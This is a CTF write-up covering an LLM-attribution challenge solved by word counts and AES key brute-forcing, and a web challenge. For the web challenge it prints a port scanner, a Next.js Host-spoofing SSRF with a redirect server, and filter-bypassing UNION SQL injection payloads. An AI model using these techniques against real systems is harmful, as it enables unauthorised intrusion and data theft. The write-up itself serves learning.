---
dg-publish: true
aliases:
---
## ai - GPT Detector

>Tired of Turnitin AI detector? It's time to show your reverse card...

We're given 64 files each of `openai/gpt-4o` and `qwen/qwen-2.5-72b-instruct` responses to a prompt, that were randomly shuffled and used to generate an AES key to encrypt the flag (0 bit for qwen, 1 for gpt). We need to classify most of the files, so that the remaining bits can be bruteforced. We also have the response generation and encryption code, including the prompt.

--- 

```python
def generate(model):
    completion = client.chat.completions.create(
        model=model,
        messages=[{
            "role": "system",
            "content": "You are a helpful assistant."
        }, {
            "role": "user",
            "content": "Write a random interesting 500-word essay in English. Do not use markdown formatting. Do not write any title."
        }]
    )

    return completion.choices[0].message.content
```

---

At first glance I found a couple of LLM detection papers including this [perplexity approach](https://arxiv.org/abs/2305.15004), but nothing that could do attribution without a bunch of expensive training data. And most of the binary classification was human vs AI, rather than model vs model. So I pivoted to binary k-means clustering with [sentence transformers](https://sbert.net/) and later [TfidfVectorizer](https://scikit-learn.org/stable/modules/generated/sklearn.feature_extraction.text.TfidfVectorizer.html). This seemed pretty reasonable, the models are from different companies so surely they'd use different vocabulary? Each response was pretty large too so I assumed semantic analysis wasn't intended. Even though my teammate teddy generated a bunch of gpt responses, and got the feeling gpt responses included more scientific topics.

---

```python

# Create and fit vectorizer on all texts (train + test)
vectorizer = TfidfVectorizer(ngram_range=(2, 4), max_features=200)
all_texts = train_texts + test_texts
X_all = vectorizer.fit_transform(all_texts)

# Split into train and test features
X_train = X_all[:len(train_texts)]
X_test = X_all[len(train_texts):]

# Train KMeans using labeled data
kmeans = KMeans(n_clusters=2, random_state=42)
kmeans.fit(X_train)

# Get cluster centers and ensure they align with our labels
# Calculate average distance to each center for each class
dist_0 = np.mean([kmeans.transform(X_train[i].reshape(1, -1))[0]
                 for i, label in enumerate(train_labels) if label == 0], axis=0)
dist_1 = np.mean([kmeans.transform(X_train[i].reshape(1, -1))[0]
                 for i, label in enumerate(train_labels) if label == 1], axis=0)

# Determine if we need to flip cluster assignments
flip_clusters = (dist_0[0] > dist_0[1])  # True if cluster 1 is closer to class 0

# Predict test samples
distances = kmeans.transform(X_test)
diff = distances[:, 1] - distances[:, 0]

# Sort indices by confidence (diff value)
indices_sorted = np.argsort(diff)

# Force balanced labels - assign 64 to each class
balanced_labels = np.empty(len(test_texts), dtype=int)
if flip_clusters:
    # More positive diff means closer to cluster 1
    balanced_labels[indices_sorted[:64]] = 1  # Most negative diff -> class 1
    balanced_labels[indices_sorted[64:]] = 0  # Most positive diff -> class 0
else:
    # More negative diff means closer to cluster 0
    balanced_labels[indices_sorted[:64]] = 0  # Most negative diff -> class 0
    balanced_labels[indices_sorted[64:]] = 1  # Most positive diff -> class 1

# Compute confidence as absolute difference between distances
confidence = np.abs(diff)

# Create results dictionary with balanced labels
results = {}
for filename, label, conf in zip(test_filenames, balanced_labels, confidence):
    results[filename] = (label, conf)
```

But confidence levels on the classifier were pretty low even after optimising for n-grams. teddy manually labelled a dozen or so responses, so I tried tuning the vectorizer against them or even outright training. Took a while to realise it was just overfitting. I was a few hours in at this point and took a break, while teddy generated some sample data from both models with OpenRouter and the provided generation script.

I came back to try using the data for training, but realised by dumping features that word/phrase choice was pretty similar between models unfortunately. Same with a brief attempt at prefix/suffix strings. So at this point I was ready to scrap the whole sentence approach and revisit perplexity or something. teddy had spent a while with samples at this point too and reckoned word features weren't viable.

```
['ability to' 'about the' 'and even' 'and the' 'around the' 'as the'
 'as we' 'aspects of' 'at the' 'beauty and' 'began to' 'but also' 'by the'
 'can be' 'climate change' 'concept of' 'continue to' 'continues to'
 'crucial role' 'for example' 'for instance' 'for the' 'from the'
 'has also' 'has become' 'has been' 'have been' 'heart of' 'heart of the'
 'however the' 'importance of' 'in conclusion' 'in the' 'in the heart'
 'in the heart of' 'in this' 'in world' 'into the' 'is also' 'is more'
 'is not' 'is not just' 'is testament' 'is testament to'
 'is testament to the' 'is the' 'it is' 'it was' 'known as' 'lead to'
 'leading to' 'led to' 'more than' 'more than just' 'natural world'
 'nature of' 'not just' 'not only' 'of ai' 'of human' 'of its' 'of life'
 'of nature' 'of our' 'of the' 'of the city' 'of the most' 'of the world'
 'of their' 'of these' 'of this' 'of time' 'of urban' 'on the' 'one of'
 'one of the' 'one of the most' 'our understanding' 'our understanding of'
 'part of' 'place where' 'power of' 'reminder of' 'reminder of the'
 'reminder that' 'role in' 'sense of' 'serves as' 'story of' 'such as'
 'symbol of' 'tapestry of' 'testament to' 'testament to the' 'than just'
 'that can' 'that has' 'that is' 'that the' 'the air' 'the amazon'
 'the beauty' 'the city' 'the community' 'the concept' 'the concept of'
 'the digital' 'the earth' 'the enduring' 'the forest' 'the future'
 'the garden' 'the heart' 'the heart of' 'the heart of the' 'the human'
 'the importance' 'the importance of' 'the intricate' 'the most'
 'the natural' 'the natural world' 'the ocean' 'the park' 'the past'
 'the potential' 'the power' 'the power of' 'the story' 'the town'
 'the universe' 'the vast' 'the way' 'the world'...]
```

We were past midnight when teddy realised the file sizes for the qwen samples were consistently larger than the GPT samples, around 4000-5000 bytes. So we could fix the bits for files over a certain size, and bruteforce the rest. Unfortunately taking a conservative 4500 bytes only gave us 38 files (38 known bits) and the remainder wasn't feasible to bruteforce.

I wrote a script to sort by file size anyway for something to do, hoping I could work my way down from 4500 and see how long the remaining bits took. I was sent this screenshot in response.

![[Pasted image 20250330141916.png|Pasted image 20250330141916.png]]

After a fair bit of testing, teddy realised the file count was also a good heuristic, seemingly above the 500-600 range for qwen. I quickly modified my script to find files above 600 words, and ended up with this:

```python
import os
from pathlib import Path

ESSAYS_DIR = "essays"
WORD_LIMIT = 600

def count_words(file_path):
    with open(file_path, 'r', encoding='utf-8') as f:
        text = f.read()
        return len(text.split())

def clean_filename(filename):
    # Remove extension and any leading zeros
    name = filename.rsplit('.', 1)[0]  # Remove extension
    return str(int(name)) if name.isdigit() else name

qwen_count = 0
gpt_count = 0

files_info = []
# Walk through essays directory
for file_path in Path(ESSAYS_DIR).glob('*'):
    if file_path.is_file():
        word_count = count_words(file_path)
        classification = "qwen" if word_count > WORD_LIMIT else "gpt"
        files_info.append((file_path.name, word_count, classification))
        if classification == "qwen":
            qwen_count += 1
        else:
            gpt_count += 1

# Sort files by word count (descending)
files_info.sort(key=lambda x: x[1], reverse=True)

# Display summary first
print(f"Summary:")
print(f"Qwen files: {qwen_count}")
print(f"GPT files: {gpt_count}\n")

# Display only file numbers for Qwen files
print("Qwen files (most words to least):")
for name, count, classification in files_info:
    if classification == "qwen":
        clean_name = clean_filename(name)
        print(clean_name)

```

Which was quick to plug into my multithreaded bruteforcing script - not so infeasible now.

```python
from Crypto.Cipher import AES
from itertools import combinations
import numpy as np
from tqdm import tqdm
from math import comb
import time
from concurrent.futures import ProcessPoolExecutor, wait, FIRST_COMPLETED
import multiprocessing
from itertools import islice

nonce_hex = "3d6b85f9299442b2219a44aee1345e16"
ciphertext_hex = ("c88f0e97fbe289c7800a68c2aae64a1825e0405cca87f6360e5f194e43978e17"
                  "72f09a5bd2812cf9db8cf9008be7e34222ed9ee22bf6188358a49ada4e6d5ae16"
                  "e71b0807d414f")
tag_hex = "c58e546b2fed995d0a6a723c8f10f6d1"

nonce = bytes.fromhex(nonce_hex)
ciphertext = bytes.fromhex(ciphertext_hex)
tag = bytes.fromhex(tag_hex)

def try_decrypt(key):
    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    try:
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        return plaintext.decode('utf-8')
    except Exception as e:
        return None

# Known zero positions (0-indexed) from file size
# zero_positions = {5, 7, 12, 15, 16, 17, 20, 21, 24, 27, 32, 39, 42, 46, 59, 62, 
#                  68, 70, 71, 74, 78, 82, 86, 90, 93, 95, 96, 99, 101, 102, 105, 
#                  107, 109, 111, 115, 116, 117, 121,
#                  73, 118, 108, 81, 49, 66, 91, 87, 36, 106,
#                 #  80, 34, 103, 125, 2, 94, 44, 38, 26, 69, 14
#                  }
zero_positions = {17, 95, 82, 48, 62, 16, 101, 27, 90, 109, 117, 42, 12, 46, 21, 86, 107, 15, 93, 115, 59, 70, 7, 116, 68, 111, 32, 39, 71, 20, 121, 102, 5, 81, 105, 78, 96, 73, 74, 49, 80, 108, 91, 118, 24, 36, 69, 66, 99, 50, 88, 34, 53, 94, 103, 87, 64, 72, 38, 13, # 51, 26, 52
}

def generate_key(bit_pattern):
    # Start with all zeros
    key_bits = np.zeros(128, dtype=np.uint8)
    
    # Fill non-zero positions with the bit pattern
    non_zero_positions = [i for i in range(128) if i not in zero_positions]
    for pos, bit in zip(non_zero_positions, bit_pattern):
        key_bits[pos] = bit
    
    # Convert bit array to bytes
    key_bytes = np.packbits(key_bits).tobytes()
    return key_bytes

def chunk_combinations(iterable, chunk_size):
    iterator = iter(iterable)
    return iter(lambda: list(islice(iterator, chunk_size)), [])

def worker(chunk):
    for ones_positions in chunk:
        bit_pattern = [1 if i in ones_positions else 0 for i in range(128 - len(zero_positions))]
        key = generate_key(bit_pattern)
        result = try_decrypt(key)
        if result:
            return key, result
    return None

def bruteforce():
    # Calculate total combinations
    non_zero_positions = 128 - len(zero_positions)
    total_combinations = comb(non_zero_positions, 64)
    print(f"Total combinations to try: {total_combinations:,}")
    
    # Create all combinations iterator
    positions = range(non_zero_positions)
    all_combinations = combinations(positions, 64)
    
    # Split into chunks for parallel processing
    chunk_size = 1000
    chunks = chunk_combinations(all_combinations, chunk_size)
    
    # Setup progress bar
    pbar = tqdm(total=total_combinations, unit='keys')
    start_time = time.time()
    
    # Use half of available CPU cores
    num_processes = max(1, multiprocessing.cpu_count())
    print(f"Using {num_processes} processes")
    
    with ProcessPoolExecutor(max_workers=num_processes) as executor:
        futures = []
        
        # Submit initial batch of chunks
        for _ in range(num_processes * 2):
            chunk = next(chunks, None)
            if chunk is None:
                break
            futures.append(executor.submit(worker, chunk))
        
        while futures:
            # Wait for the first future to complete
            done, futures = wait(futures, return_when=FIRST_COMPLETED)
            
            for future in done:
                result = future.result()
                pbar.update(chunk_size)
                
                if result:
                    # Found the key
                    key, plaintext = result
                    pbar.close()
                    print(f"\nFound key: {key.hex()}")
                    print(f"Decrypted message: {plaintext}")
                    executor.shutdown(wait=False)
                    return True
                
                # Submit new chunk if available
                chunk = next(chunks, None)
                if chunk is not None:
                    futures.add(executor.submit(worker, chunk))
    
    pbar.close()
    return False

if __name__ == "__main__":
    print("Starting bruteforce...")
    multiprocessing.freeze_support()  # Required for Windows
    if not bruteforce():
        print("Key not found")
```

But it immediately failed. There were 63 files with over 600 words, it was too good to be true. So I started working my way down, commenting out files with the least number of words (51, 26, and 52 in the list) that would be the most likely false positives. Until I eventually hit the solve!

![[Pasted image 20250330011017.png|Pasted image 20250330011017.png]]

teddy had been writing his own bruteforce in the background, with only 59 known bits (different word counter maybe?), and his finished around 15 minutes later.

It seemed a bit offtopic for an AI chal rather than misc though. Turns out the intended solve was calculating perplexity using qwen's open weights, and the author was pretty disappointed. dfyz used a really nice approach though - qwen logprob of next token for each response - and I hope they do a writeup. That might be a generalised solution too.
## web - Hide and Seek

>Play Hide-and-Seek with pretty button!  
( + I don't know the internal web server's port exactly, but I heard it's "well-known". )

A three-tier webapp, we only get source for the external Next.js server and a `docker-compose.yml` with static IPs for the internal webserver and db. The Next.js server had a single endpoint `POST /api/reset-game`, with blind SSRF in a body parameter `{"url":"https://webhook.tplant.com.au/273441c2-d8d2-47fb-bb3d-107187ac0560"}`.

```ts
const response = await fetch(`${body.url}?date=${Date()}&message=Congratulation! you found button!`, {
	method: "GET",
	redirect: "manual",
});
...
return NextResponse.json({ message: "Sended!" }, { status: 200 });
```

It would ratelimit clients by IP from `x-forwarded-for` for 10 mins after a successful request to `url`, but not unsuccessful, so I bruteforced the internal webserver port hinted by the flavourtext to get `http://192.168.200.120:808`.

```python
import requests

url = "http://3.38.141.72:3000/api/reset-game"

def try_port(port):
    payload = {
        "url": f"http://192.168.200.120:{port}"
    }
    try:
        response = requests.post(url, json=payload)
        return response.status_code == 200 and "success" in response.text.lower()
    except requests.exceptions.RequestException:
        return False

def port_scan():
    for port in range(1, 10000):
        print(f"Trying port {port}...", end='\r')
        if try_port(port):
            print(f"\nSuccess! Found working port: {port}")
            return port
    print("\nNo working port found")
    return None

if __name__ == "__main__":
    port_scan()
```

I could also control URL params, by adding a fragment to remove the existing params:

`http://192.168.200.120:808/?foo=bar# -> http://192.168.200.120:808/?foo=bar#?date=...&message=Congratulation! you found button!`

I got stuck for a while here, trying to confirm it was actually blind. It would've been a pain to chain an SSRF on the webserver without source code. Eventually I found this [Assetnote post on a Next.js GET SSRF n-day](https://www.assetnote.io/resources/research/digging-for-ssrf-in-Next.js-apps) , and realised the frontend was an ancient Next.js version (`v14.1.0` right before the vuln was patched). I threw together a webhook to test.

```python
from flask import Flask, Response, request, redirect
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    return redirect('http://192.168.200.120:808')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
```

Then implemented `Host` spoofing from the post. This took way longer than it should've, I really need to build better [[CTF Tooling|CTF Tooling]]...

```python
import requests

headers = {
    "Host": "scene-settings-her-licence.trycloudflare.com",  # Using the spoofed host as requested
    "Next-Action": "6e6feac6ad1fb92892925b4e3766928a754aec71",
    "Next-Router-State-Tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0"
}

response = requests.post("http://3.38.141.72:3000/", data='[]', headers=headers)
print(response.text)
```

And we hit the homepage!

```html
<body>
    <h1>Welcome to Internal server!</h1>
    <a href="/login">Go to Login Page</a>
    <a href="/archive">Go to Archive</a>
</body>
```

`/archive` required login, but`/login` was helpful.

```html
<body>
    <h1>Login</h1>

    <!-- Just legacy code. But still work. -->
    <!-- Test Account: guest / guest -->

    <!-- <form action="/login" method="get">
        <input name="key" type="hidden" value="392cc52f7a5418299a5eb22065bd1e5967c25341">
        <label for="name">Username</label>
        <input name="username" type="text"><br>
        <label for="name">Password</label>
        <input name="password" type="text"><br>
        <button type="submit">Login</button>
    </form> -->

    <form action="/login" method="post">
        <label for="name">Username</label>
        <input name="username" type="text"><br>
        <label for="name">Password</label>
        <input name="password" type="text"><br>
        <button type="submit">Login</button>
    </form>

</body>
```

The obvious `/login?key=392cc52f7a5418299a5eb22065bd1e5967c25341&username=guest&password=guest` just returned `{"message":"Welcome! guest, You are not admin."}` though, and I got stuck for a while thinking we needed to access the response's `Set-Cookie` somehow. Or mint our own cookie - yep, this is what JWT brainrot looks like. I even hashcracked the key (`neverguessable`). But in the last half hour I realised it was just SQLi in `username` or `password`... So I pulled in teammates to help.

`username` and `or` were getting replaced, so we couldn't just `or 1=1`. We tried unicode substitution and comments like `user/**/name`, but bradan came in clutch with `userusernamename` .

`http://192.168.200.120:808?key=...&username=test' UNION SELECT * from users WHERE userusernamename LIKE '%'-- ;&password=test`

 This returned the `aaa` user so we tried `LIKE 'admin'`, then spent an intense couple minutes figuring out `admin` was also substituted.`LIKE 'admadminin'` authenticated and the server response told us the flag was the password. toasterpwn tried a column select and after some frantic attempts with `password`, we finally solved it 8 minutes before the CTF ended.
 
 `username=test' UNION SELECT passwoorrd,1 from users WHERE userusernamename LIKE 'admadminin' -- ;` returned the flag `codegate2025{83ef613335c8534f61d83efcff6c2e18be19743069730d77bf8fb9b18f79bfb9}`.

